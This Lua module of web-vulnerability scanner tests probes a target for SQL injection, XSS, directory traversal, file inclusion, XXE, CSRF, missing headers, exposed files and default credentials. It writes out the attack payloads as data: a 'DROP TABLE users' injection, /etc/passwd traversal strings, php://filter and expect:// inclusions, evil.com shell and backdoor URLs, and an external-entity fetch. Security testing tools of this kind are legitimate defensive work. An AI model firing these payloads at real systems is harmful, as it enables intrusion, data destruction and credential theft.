-- Vulnerability Detection Modules
local VulnTests = {}

-- SQL Injection Detection
function VulnTests.test_sql_injection(scanner)
    print("[*] Testing for SQL Injection vulnerabilities...")
    
    local sql_payloads = {
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT null--",
        "'; DROP TABLE users;--",
        "' OR 'a'='a",
        "1' OR 1--",
        "1' OR 1=1--",
        "1' OR '1'='1",
        "1' UNION SELECT 1,2,3--",
        "1' AND 1=2 UNION SELECT 1,version(),database()--"
    }
    
    local sql_errors = {
        "SQL syntax.*MySQL",
        "Warning.*mysql_.*",
        "valid MySQL result",
        "MySqlClient\\.",
        "PostgreSQL.*ERROR",
        "Warning.*pg_.*",
        "valid PostgreSQL result",
        "Npgsql\\.",
        "Driver.*SQL.*Server.*ODBC",
        "OLE DB.*SQL Server",
        "(\\W)SQL.*Server.*Driver",
        "Warning.*mssql_.*",
        "(\\W)SQL.*Server.*[0-9a-fA-F]{8}",
        "Exception.*Oracle",
        "Oracle error",
        "Oracle.*Driver",
        "Warning.*oci_.*",
        "Warning.*ora_.*",
        "Microsoft.*OLE.*DB.*Oracle",
        "Microsoft.*OLE.*DB.*SQL.*Server",
        "SQL.*Server.*OLE.*DB",
        "SQL.*Server.*Driver",
        "Warning.*sqlite_.*",
        "Warning.*SQLite3::",
        "\\[SQLite_error\\]"
    }
    
    -- Test GET parameters
    local response = scanner:http_request(scanner.target_url .. "?id=1")
    if response.status == 200 then
        for _, payload in ipairs(sql_payloads) do
            local test_url = scanner.target_url .. "?id=" .. payload
            local test_response = scanner:http_request(test_url)
            
            if test_response.status == 200 then
                for _, error_pattern in ipairs(sql_errors) do
                    if test_response.body:match(error_pattern) then
                        local vuln = scanner:create_vulnerability(
                            "SQL Injection",
                            "critical",
                            "SQL injection vulnerability detected in GET parameter",
                            "Payload: " .. payload .. " triggered SQL error",
                            "Use parameterized queries and input validation"
                        )
                        scanner:add_vulnerability(vuln)
                        return
                    end
                end
            end
        end
    end
    
    -- Test POST parameters
    local post_payloads = {
        "username=' OR '1'='1&password=' OR '1'='1",
        "email=' UNION SELECT null--&submit=submit",
        "search='; DROP TABLE users;--&go=search"
    }
    
    for _, post_payload in ipairs(post_payloads) do
        local headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded"
        }
        
        local post_response = scanner:http_request(scanner.target_url, "POST", headers, post_payload)
        
        if post_response.status == 200 then
            for _, error_pattern in ipairs(sql_errors) do
                if post_response.body:match(error_pattern) then
                    local vuln = scanner:create_vulnerability(
                        "SQL Injection (POST)",
                        "critical",
                        "SQL injection vulnerability detected in POST parameters",
                        "POST payload: " .. post_payload .. " triggered SQL error",
                        "Use parameterized queries and input validation"
                    )
                    scanner:add_vulnerability(vuln)
                    return
                end
            end
        end
    end
    
    print("[+] SQL Injection tests completed")
end

-- XSS Detection
function VulnTests.test_xss(scanner)
    print("[*] Testing for Cross-Site Scripting (XSS) vulnerabilities...")
    
    local xss_payloads = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<div onclick=alert('XSS')>click</div>",
        "'><script>alert('XSS')</script>",
        "\" onmouseover=alert('XSS') //",
        "</script><script>alert('XSS')</script>"
    }
    
    -- Test GET parameters
    for _, payload in ipairs(xss_payloads) do
        local test_url = scanner.target_url .. "?search=" .. payload .. "&q=" .. payload
        local response = scanner:http_request(test_url)
        
        if response.status == 200 and response.body:match(payload) then
            -- Check if payload is reflected without proper encoding
            if not response.body:match("&lt;script&gt;") and 
               not response.body:match("&#60;script&#62;") then
                local vuln = scanner:create_vulnerability(
                    "Cross-Site Scripting (XSS)",
                    "high",
                    "Reflected XSS vulnerability detected",
                    "Payload reflected in response: " .. payload,
                    "Implement proper input validation and output encoding"
                )
                scanner:add_vulnerability(vuln)
                break
            end
        end
    end
    
    -- Test POST parameters
    local post_xss_payloads = {
        "comment=<script>alert('XSS')</script>&submit=submit",
        "message=<img src=x onerror=alert('XSS')>&send=send",
        "name=<svg onload=alert('XSS')>&post=post"
    }
    
    for _, post_payload in ipairs(post_xss_payloads) do
        local headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded"
        }
        
        local response = scanner:http_request(scanner.target_url, "POST", headers, post_payload)
        
        if response.status == 200 then
            local xss_pattern = post_payload:match("=(.-)&")
            if response.body:match(xss_pattern) then
                local vuln = scanner:create_vulnerability(
                    "Stored XSS",
                    "high",
                    "Stored XSS vulnerability detected",
                    "POST payload stored and reflected: " .. xss_pattern,
                    "Implement proper input validation and output encoding"
                )
                scanner:add_vulnerability(vuln)
                break
            end
        end
    end
    
    print("[+] XSS tests completed")
end

-- Directory Traversal Detection
function VulnTests.test_directory_traversal(scanner)
    print("[*] Testing for Directory Traversal vulnerabilities...")
    
    local traversal_payloads = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%c1%9c..%c1%9c..%c1%9cwindows/system32/drivers/etc/hosts",
        "file:///etc/passwd",
        "file://c:/windows/system32/drivers/etc/hosts"
    }
    
    local sensitive_patterns = {
        "root:x:",
        "daemon:x:",
        "bin:x:",
        "# localhost",
        "127.0.0.1",
        "::1 localhost",
        "root:.*:0:0:",
        "administrator:.*:500:"
    }
    
    -- Test file parameter
    for _, payload in ipairs(traversal_payloads) do
        local test_url = scanner.target_url .. "?file=" .. payload .. "&page=" .. payload
        local response = scanner:http_request(test_url)
        
        if response.status == 200 then
            for _, pattern in ipairs(sensitive_patterns) do
                if response.body:match(pattern) then
                    local vuln = scanner:create_vulnerability(
                        "Directory Traversal",
                        "critical",
                        "Directory traversal vulnerability detected",
                        "Payload: " .. payload .. " exposed sensitive files",
                        "Implement proper input validation and use whitelisting for file access"
                    )
                    scanner:add_vulnerability(vuln)
                    return
                end
            end
        end
    end
    
    print("[+] Directory Traversal tests completed")
end

-- File Inclusion Detection
function VulnTests.test_file_inclusion(scanner)
    print("[*] Testing for File Inclusion vulnerabilities...")
    
    local lfi_payloads = {
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=config.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "expect://id",
        "expect://whoami"
    }
    
    local rfi_payloads = {
        "http://evil.com/shell.txt",
        "https://evil.com/backdoor.php",
        "ftp://evil.com/malware.php",
        "//evil.com/exploit.txt",
        "\\\\evil.com\\share\\shell.php"
    }
    
    -- Test Local File Inclusion (LFI)
    for _, payload in ipairs(lfi_payloads) do
        local test_url = scanner.target_url .. "?include=" .. payload .. "&page=" .. payload
        local response = scanner:http_request(test_url)
        
        if response.status == 200 then
            -- Check for PHP source code or system information
            if response.body:match("root:x:") or 
               response.body:match("<?php") or
               response.body:match("localhost") or
               response.body:match("# localhost") then
                local vuln = scanner:create_vulnerability(
                    "Local File Inclusion (LFI)",
                    "critical",
                    "Local file inclusion vulnerability detected",
                    "Payload: " .. payload .. " included local file",
                    "Implement proper input validation and use whitelisting"
                )
                scanner:add_vulnerability(vuln)
                return
            end
        end
    end
    
    -- Test Remote File Inclusion (RFI)
    for _, payload in ipairs(rfi_payloads) do
        local test_url = scanner.target_url .. "?include=" .. payload
        local response = scanner:http_request(test_url)
        
        -- RFI might timeout or show different behavior
        if response.status and (response.status == 200 or response.status == 403) then
            local vuln = scanner:create_vulnerability(
                "Remote File Inclusion (RFI)",
                "critical",
                "Potential remote file inclusion vulnerability",
                "Payload: " .. payload .. " might allow remote file inclusion",
                "Disable allow_url_include in PHP configuration and validate input"
            )
            scanner:add_vulnerability(vuln)
            return
        end
    end
    
    print("[+] File Inclusion tests completed")
end

-- XXE Detection
function VulnTests.test_xxe(scanner)
    print("[*] Testing for XML External Entity (XXE) vulnerabilities...")
    
    local xxe_payloads = {
        [[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>]],
        
        [[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
%xxe;
]>
<foo></foo>]],
        
        [[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://evil.com/xxe.xml">
]>
<foo>&xxe;</foo>]]
    }
    
    local headers = {
        ["Content-Type"] = "application/xml",
        ["Accept"] = "application/xml"
    }
    
    for _, payload in ipairs(xxe_payloads) do
        local response = scanner:http_request(scanner.target_url, "POST", headers, payload)
        
        if response.status == 200 then
            -- Check for file content in response
            if response.body:match("root:x:") or 
               response.body:match("daemon:x:") or
               response.body:match("bin:x:") then
                local vuln = scanner:create_vulnerability(
                    "XML External Entity (XXE)",
                    "critical",
                    "XXE vulnerability detected",
                    "XML payload with external entity processed",
                    "Disable external entity processing in XML parser"
                )
                scanner:add_vulnerability(vuln)
                return
            end
        end
    end
    
    print("[+] XXE tests completed")
end

-- CSRF Detection
function VulnTests.test_csrf(scanner)
    print("[*] Testing for Cross-Site Request Forgery (CSRF) vulnerabilities...")
    
    -- Check for forms that might be vulnerable to CSRF
    local response = scanner:http_request(scanner.target_url)
    
    if response.status == 200 then
        -- Look for forms without CSRF tokens
        local forms = {}
        for form in response.body:gmatch("<form[^>]*>(.-)</form>") do
            table.insert(forms, form)
        end
        
        for _, form in ipairs(forms) do
            -- Check for CSRF protection tokens
            local has_csrf_token = form:match("csrf_token") or 
                                 form:match("authenticity_token") or
                                 form:match("_token") or
                                 form:match("csrf")
            
            if not has_csrf_token then
                -- Check for important actions
                local has_sensitive_action = form:match("password") or
                                           form:match("delete") or
                                           form:match("update") or
                                           form:match("admin")
                
                if has_sensitive_action then
                    local vuln = scanner:create_vulnerability(
                        "Cross-Site Request Forgery (CSRF)",
                        "medium",
                        "Potential CSRF vulnerability in form",
                        "Form lacks CSRF protection token for sensitive action",
                        "Implement CSRF tokens for all state-changing operations"
                    )
                    scanner:add_vulnerability(vuln)
                    return
                end
            end
        end
    end
    
    print("[+] CSRF tests completed")
end

-- Insecure Headers Detection
function VulnTests.test_insecure_headers(scanner)
    print("[*] Testing for insecure HTTP headers...")
    
    local response = scanner:http_request(scanner.target_url)
    
    if response.status == 200 then
        local headers = response.headers
        local missing_headers = {}
        
        -- Check for missing security headers
        if not headers["x-frame-options"] and not headers["X-Frame-Options"] then
            table.insert(missing_headers, "X-Frame-Options")
        end
        
        if not headers["x-content-type-options"] and not headers["X-Content-Type-Options"] then
            table.insert(missing_headers, "X-Content-Type-Options")
        end
        
        if not headers["x-xss-protection"] and not headers["X-XSS-Protection"] then
            table.insert(missing_headers, "X-XSS-Protection")
        end
        
        if not headers["strict-transport-security"] and not headers["Strict-Transport-Security"] then
            table.insert(missing_headers, "Strict-Transport-Security")
        end
        
        if not headers["content-security-policy"] and not headers["Content-Security-Policy"] then
            table.insert(missing_headers, "Content-Security-Policy")
        end
        
        if not headers["x-powered-by"] and not headers["X-Powered-By"] then
            -- This is actually good - server should not expose technology stack
        else
            local vuln = scanner:create_vulnerability(
                "Information Disclosure - X-Powered-By",
                "low",
                "Server technology disclosed via X-Powered-By header",
                "X-Powered-By header reveals server technology",
                "Remove X-Powered-By header to hide server technology"
            )
            scanner:add_vulnerability(vuln)
        end
        
        if #missing_headers > 0 then
            local vuln = scanner:create_vulnerability(
                "Missing Security Headers",
                "medium",
                "Important security headers are missing",
                "Missing headers: " .. table.concat(missing_headers, ", "),
                "Implement all recommended security headers"
            )
            scanner:add_vulnerability(vuln)
        end
    end
    
    print("[+] Insecure headers tests completed")
end

-- Information Disclosure Detection
function VulnTests.test_information_disclosure(scanner)
    print("[*] Testing for information disclosure vulnerabilities...")
    
    local disclosure_paths = {
        "/robots.txt",
        "/sitemap.xml",
        "/.htaccess",
        "/.git/config",
        "/.svn/entries",
        "/.DS_Store",
        "/web.config",
        "/phpinfo.php",
        "/info.php",
        "/test.php",
        "/config.php",
        "/database.php",
        "/backup.sql",
        "/dump.sql",
        "/error_log",
        "/access_log",
        "/.env",
        "/composer.json",
        "/package.json",
        "/bower.json",
        "/gulpfile.js",
        "/webpack.config.js"
    }
    
    local url_info = scanner:validate_url(scanner.target_url)
    local base_url = url_info.protocol .. "://" .. url_info.host .. ":" .. url_info.port
    
    for _, path in ipairs(disclosure_paths) do
        local test_url = base_url .. path
        local response = scanner:http_request(test_url)
        
        if response.status == 200 and #response.body > 0 then
            local vuln = scanner:create_vulnerability(
                "Information Disclosure - " .. path,
                "medium",
                "Sensitive information disclosed via " .. path,
                "Accessible path: " .. path,
                "Remove or protect sensitive files from public access"
            )
            scanner:add_vulnerability(vuln)
        end
    end
    
    print("[+] Information disclosure tests completed")
end

-- Weak Authentication Detection
function VulnTests.test_weak_authentication(scanner)
    print("[*] Testing for weak authentication mechanisms...")
    
    -- Test for common admin/login paths
    local auth_paths = {
        "/admin",
        "/admin.php",
        "/administrator",
        "/login",
        "/login.php",
        "/wp-admin",
        "/wp-login.php",
        "/cpanel",
        "/control",
        "/manage",
        "/dashboard",
        "/panel"
    }
    
    local url_info = scanner:validate_url(scanner.target_url)
    local base_url = url_info.protocol .. "://" .. url_info.host .. ":" .. url_info.port
    
    for _, path in ipairs(auth_paths) do
        local test_url = base_url .. path
        local response = scanner:http_request(test_url)
        
        if response.status == 200 then
            -- Check for weak authentication indicators
            if response.body:match("password.*password") or
               response.body:match("Password.*Password") then
                local vuln = scanner:create_vulnerability(
                    "Weak Authentication",
                    "high",
                    "Potential weak authentication mechanism",
                    "Admin/login page may have weak authentication: " .. path,
                    "Implement strong authentication mechanisms and rate limiting"
                )
                scanner:add_vulnerability(vuln)
            end
        end
    end
    
    -- Test for default credentials
    local default_creds = {
        {username = "admin", password = "admin"},
        {username = "admin", password = "password"},
        {username = "admin", password = "123456"},
        {username = "root", password = "root"},
        {username = "test", password = "test"},
        {username = "demo", password = "demo"}
    }
    
    for _, creds in ipairs(default_creds) do
        local login_payload = string.format("username=%s&password=%s", creds.username, creds.password)
        local headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded"
        }
        
        local login_url = base_url .. "/login"
        local response = scanner:http_request(login_url, "POST", headers, login_payload)
        
        if response.status == 200 or response.status == 302 then
            -- Check for successful login indicators
            if response.body:match("welcome") or
               response.body:match("dashboard") or
               response.body:match("logout") or
               response.headers["location"] then
                local vuln = scanner:create_vulnerability(
                    "Default Credentials",
                    "critical",
                    "Default credentials may be in use",
                    string.format("Default credentials (%s:%s) might work", creds.username, creds.password),
                    "Change default credentials and implement strong password policies"
                )
                scanner:add_vulnerability(vuln)
                break
            end
        end
    end
    
    print("[+] Weak authentication tests completed")
end

return VulnTests